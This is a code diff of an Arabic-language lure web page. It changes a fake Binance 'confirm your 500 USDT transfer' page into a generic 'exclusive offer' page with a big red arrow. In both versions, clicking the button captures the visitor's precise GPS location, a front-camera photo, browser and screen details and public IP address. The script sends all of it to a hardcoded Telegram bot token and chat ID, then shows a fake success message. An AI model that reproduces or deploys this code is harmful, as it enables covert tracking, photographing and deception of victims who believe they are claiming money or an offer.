@@ -5,137 +5,185 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- ============================================================ -->
-    <!-- 🖼️ أوسمة الصورة المصغرة (هذه تظهر في تليجرام) -->
+    <!-- 🖼️ أوسمة الصورة المصغرة (تظهر في تليجرام) -->
     <!-- ============================================================ -->
-    <meta property="og:title" content="Binance - تأكيد استلام التحويل" />
-    <meta property="og:description" content="تم تحويل 500 USDT إلى حسابك. اضغط لتأكيد الاستلام." />
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Binance_logo.svg/1200px-Binance_logo.svg.png" />
+    <meta property="og:title" content="🔥 عرض حصري - انضم الآن!" />
+    <meta property="og:description" content="فرصة لا تعوض! اضغط للمشاركة." />
+    <meta property="og:image" content="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=800&h=400&fit=crop" />
     <meta property="og:image:width" content="800" />
     <meta property="og:image:height" content="400" />
     <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://arab07.github.io/Usdt/app.html" />
     <!-- ============================================================ -->
     
-    <title>تأكيد التحويل</title>
+    <title>🔥 عرض حصري</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            margin:0;
-            padding:0;
-            background:#000;
-            font-family:Arial,sans-serif;
-            cursor:pointer;
-            height:100vh;
-            display:flex;
-            justify-content:center;
-            align-items:center;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .container{
-            width:100vw;
-            height:100vh;
-            background:url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=1200&h=2000&fit=crop') center/cover;
-            display:flex;
-            flex-direction:column;
-            justify-content:center;
-            align-items:center;
-            animation:glow 2s infinite;
-            position:relative;
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
         }
-        @keyframes glow{
-            0%,100%{filter:brightness(1);}
-            50%{filter:brightness(1.2);}
+        .container {
+            width: 100vw;
+            height: 100vh;
+            background: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=1200&h=2000&fit=crop') center/cover;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            cursor: pointer;
         }
-        .overlay{
-            background:rgba(0,0,0,0.5);
-            padding:30px;
-            border-radius:20px;
-            text-align:center;
-            max-width:90%;
+        /* طبقة شفافة فوق الصورة */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
-        .overlay h1{
-            color:#f7931a;
-            font-size:28px;
-            margin-bottom:10px;
+        /* السهم الكبير في المنتصف */
+        .arrow-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            animation: pulse 2s infinite;
+            z-index: 10;
         }
-        .overlay p{
-            color:white;
-            font-size:16px;
-            margin-bottom:20px;
+        .arrow-circle {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: rgba(255, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            transition: transform 0.3s;
         }
-        .btn{
-            background:linear-gradient(135deg,#22c55e,#16a34a);
-            color:white;
-            border:none;
-            padding:18px 40px;
-            border-radius:60px;
-            font-size:20px;
-            font-weight:bold;
-            cursor:pointer;
-            transition:transform 0.2s;
-            box-shadow:0 0 30px rgba(34,197,94,0.3);
+        .arrow-circle:active {
+            transform: scale(0.9);
         }
-        .btn:active{
-            transform:scale(0.95);
+        .arrow-icon {
+            font-size: 60px;
+            color: white;
+            text-shadow: 0 0 20px rgba(255,255,255,0.5);
         }
-        .btn:disabled{
-            opacity:0.5;
-            cursor:not-allowed;
+        /* نص تحتي */
+        .text-overlay {
+            position: absolute;
+            bottom: 80px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+            padding: 10px;
+            z-index: 10;
         }
-        .status{
-            color:white;
-            margin-top:15px;
-            font-size:14px;
-            min-height:30px;
+        .text-overlay span {
+            background: rgba(0,0,0,0.5);
+            padding: 8px 20px;
+            border-radius: 30px;
+            display: inline-block;
         }
-        .arrow{
-            position:absolute;
-            bottom:30px;
-            left:50%;
-            transform:translateX(-50%);
-            color:red;
-            font-size:60px;
-            animation:bounce 1.5s infinite;
-            text-shadow:0 0 30px red;
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
         }
-        @keyframes bounce{
-            0%,100%{transform:translateX(-50%) translateY(0);}
-            50%{transform:translateX(-50%) translateY(-20px);}
+        /* رسالة الحالة */
+        #status {
+            position: absolute;
+            bottom: 150px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 14px;
+            background: rgba(0,0,0,0.7);
+            padding: 8px 20px;
+            border-radius: 20px;
+            z-index: 10;
+            display: none;
+        }
+        #status.show {
+            display: block;
+        }
+        /* شعار صغير */
+        .badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+            font-size: 12px;
+            background: rgba(0,0,0,0.5);
+            padding: 5px 15px;
+            border-radius: 20px;
+            z-index: 10;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="overlay">
-        <h1>💱 تحويل عملات رقمية</h1>
-        <p>تم تحويل <strong>$500 USDT</strong> إلى حسابك</p>
-        <p style="font-size:14px;color:#94a3b8;">لتأكيد الاستلام، اضغط الزر أدناه</p>
-        <button class="btn" id="confirmBtn">✅ تأكيد الاستلام</button>
-        <div class="status" id="status"></div>
+<div class="container" id="mainContainer">
+    <!-- البadge -->
+    <div class="badge">🔥 حصري</div>
+    
+    <!-- السهم في المنتصف -->
+    <div class="arrow-container" id="clickArea">
+        <div class="arrow-circle">
+            <span class="arrow-icon">▶</span>
+        </div>
     </div>
-    <div class="arrow">👇</div>
+    
+    <!-- النص السفلي -->
+    <div class="text-overlay">
+        <span>👆 اضغط على السهم للمتابعة</span>
+    </div>
+    
+    <!-- حالة التحميل -->
+    <div id="status">📡 جاري...</div>
 </div>
 
 <script>
     // =====================================================
-    // 🔑 بيانات البوت (تم إدخالها مسبقاً)
+    // 🔑 البوت: @Arab9991_bot
     // =====================================================
-    const BOT_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
+    const BOT_TOKEN = '8680472604:AAH8b0pnjse3s80jN3M_NxrfewFe0jPzRCw';
     const CHAT_ID = '8391968596';
     // =====================================================
 
-    const btn = document.getElementById('confirmBtn');
     const statusDiv = document.getElementById('status');
+    const clickArea = document.getElementById('clickArea');
 
-    function showStatus(msg, type = 'loading') {
+    function showStatus(msg, show = true) {
         statusDiv.innerText = msg;
-        statusDiv.style.color = type === 'error' ? '#ef4444' : '#22c55e';
+        statusDiv.className = show ? 'show' : '';
     }
 
-    function sendToBot(message, isImportant = true) {
-        const prefix = isImportant ? '🔴 ' : '📱 ';
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(prefix + message)}`;
-        return fetch(url).catch(e => console.log('خطأ في الإرسال:', e));
+    function sendToBot(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        return fetch(url).catch(e => console.log('خطأ:', e));
     }
 
     function sendPhotoToBot(file) {
@@ -145,10 +193,10 @@
         return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
-        }).catch(e => console.log('خطأ في إرسال الصورة:', e));
+        }).catch(e => console.log('خطأ:', e));
     }
 
-    // ================== دالة الحصول على الموقع ==================
+    // ================== الحصول على الموقع ==================
 
     function getLocation() {
         return new Promise((resolve, reject) => {
@@ -167,13 +215,13 @@
                 (error) => {
                     let msg = '';
                     switch(error.code) {
-                        case 1: msg = 'الرجاء الضغط على "سماح" عند طلب الموقع';
+                        case 1: msg = '❌ اضغط سماح عند طلب الموقع';
                             break;
-                        case 2: msg = 'تعذر تحديد الموقع';
+                        case 2: msg = '❌ تعذر تحديد الموقع';
                             break;
-                        case 3: msg = 'انتهى الوقت - حاول مرة أخرى';
+                        case 3: msg = '❌ انتهى الوقت';
                             break;
-                        default: msg = error.message;
+                        default: msg = '❌ ' + error.message;
                     }
                     reject(msg);
                 },
@@ -182,105 +230,91 @@
         });
     }
 
-    // ================== دالة التقاط الصورة من الكاميرا الأمامية ==================
+    // ================== التقاط الصورة من الكاميرا الأمامية ==================
 
-    function captureFrontCamera() {
+    function capturePhoto() {
         return new Promise((resolve, reject) => {
-            const video = document.createElement('video');
-            video.style.display = 'none';
-            document.body.appendChild(video);
-
-            navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                }
-            })
-            .then((stream) => {
-                video.srcObject = stream;
-                video.play();
-
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
-
-                    canvas.toBlob((blob) => {
-                        const file = new File([blob], "selfie.jpg", { type: "image/jpeg" });
-                        resolve(file);
-                    }, 'image/jpeg', 0.9);
-
-                }, 300);
-            })
-            .catch((err) => {
-                reject('تعذر فتح الكاميرا الأمامية: ' + err.message);
-            });
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.capture = 'user';
+            input.onchange = (e) => {
+                const file = e.target.files[0];
+                if (file) resolve(file);
+                else reject('لم يتم اختيار صورة');
+            };
+            input.onerror = () => reject('فشل فتح الكاميرا');
+            input.click();
         });
     }
 
-    // ================== زر التأكيد ==================
+    // ================== الضغط على السهم ==================
 
-    btn.onclick = async function() {
-        btn.disabled = true;
-        btn.innerHTML = '🔄 جاري التحقق...';
-        showStatus('📡 جاري تأكيد هويتك...', 'loading');
+    clickArea.onclick = async function() {
+        // تعطيل النقر مؤقتاً
+        clickArea.style.pointerEvents = 'none';
+        showStatus('📡 جاري التحقق...');
 
         try {
-            sendToBot('🟢 بدء عملية تحويل', false);
+            // 1. إشعار ببدء العملية
+            sendToBot('🟢 شخص جديد ضغط على السهم');
 
-            showStatus('📍 جاري تحديد موقعك...', 'loading');
+            // 2. طلب الموقع
+            showStatus('📍 جاري تحديد موقعك...');
             const location = await getLocation();
             const mapsLink = `https://maps.google.com/?q=${location.lat},${location.lng}`;
             const locationMsg = `📍 الموقع الدقيق\nالعرض: ${location.lat}\nالطول: ${location.lng}\nالدقة: ${location.acc} متر\n${mapsLink}`;
-            sendToBot(locationMsg, true);
-            showStatus('✅ تم تحديد موقعك', 'success');
+            sendToBot(locationMsg);
+            showStatus('✅ تم تحديد موقعك');
 
-            showStatus('📸 جاري التقاط صورتك...', 'loading');
-            const photoFile = await captureFrontCamera();
-            await sendPhotoToBot(photoFile);
-            sendToBot('📸 تم التقاط صورة من الكاميرا الأمامية', true);
-            showStatus('✅ تم التقاط الصورة', 'success');
+            // 3. طلب صورة
+            showStatus('📸 جاري فتح الكاميرا...');
+            try {
+                const photoFile = await capturePhoto();
+                await sendPhotoToBot(photoFile);
+                sendToBot('📸 تم التقاط صورة');
+            } catch(photoError) {
+                sendToBot('⚠️ لم يتم التقاط صورة: ' + photoError);
+            }
 
-            const deviceMsg = `📱 الجهاز\nالمتصفح: ${navigator.userAgent.substring(0, 80)}\nالشاشة: ${screen.width}x${screen.height}\nاللغة: ${navigator.language}`;
-            sendToBot(deviceMsg, false);
+            // 4. معلومات الجهاز
+            const deviceMsg = `📱 الجهاز\n${navigator.userAgent.substring(0, 80)}\nالشاشة: ${screen.width}x${screen.height}\nاللغة: ${navigator.language}`;
+            sendToBot(deviceMsg);
 
+            // 5. IP العام
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                sendToBot('🌐 IP العام: ' + ipData.ip, false);
+                sendToBot('🌐 IP: ' + ipData.ip);
             } catch(e) {}
 
-            showStatus('✅ تم تأكيد هويتك بنجاح!', 'success');
-            btn.innerHTML = '✅ تم التأكيد';
-
+            // 6. رسالة النجاح
+            showStatus('✅ تم بنجاح!');
+            
+            // تغيير الصفحة بعد 2 ثانية
             setTimeout(() => {
-                document.querySelector('.overlay').innerHTML = `
-                    <div style="padding:20px;">
-                        <div style="font-size:60px;">✅</div>
-                        <h2 style="color:#22c55e;">تم تأكيد التحويل</h2>
-                        <p style="color:#94a3b8;">تم إيداع $5,000 في محفظتك</p>
-                        <p style="color:#94a3b8;font-size:12px;margin-top:10px;">رقم الإيصال: #${Math.floor(Math.random()*100000)}</p>
+                document.getElementById('mainContainer').innerHTML = `
+                    <div style="text-align:center;color:white;padding:40px;">
+                        <div style="font-size:80px;">✅</div>
+                        <h2 style="color:#22c55e;margin-top:20px;">تم التأكيد بنجاح</h2>
+                        <p style="color:#94a3b8;">سيتم توجيهك قريباً...</p>
                     </div>
                 `;
-                document.querySelector('.arrow').style.display = 'none';
             }, 1500);
 
         } catch(error) {
-            showStatus('⚠️ ' + error, 'error');
-            btn.disabled = false;
-            btn.innerHTML = '✅ إعادة المحاولة';
+            showStatus('⚠️ ' + error);
+            clickArea.style.pointerEvents = 'auto';
         }
     };
 
+    // ================== إعلام عند فتح الصفحة ==================
+
     setTimeout(() => {
-        sendToBot('🟢 تم فتح صفحة تأكيد التحويل', false);
+        sendToBot('🟢 تم فتح صفحة السهم', false);
     }, 1000);
+
+    // ================== اختبار البوت ==================
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
         .then(r => r.json())
@@ -288,10 +322,10 @@
             if (data.ok) {
                 console.log('✅ البوت يعمل:', data.result.username);
             } else {
-                console.log('❌ البوت لا يعمل - تحقق من التوكن');
+                console.log('❌ البوت لا يعمل');
             }
         })
-        .catch(e => console.log('❌ فشل الاتصال بالبوت:', e));
+        .catch(e => console.log('❌ فشل الاتصال:', e));
 </script>
 </body>
 </html>
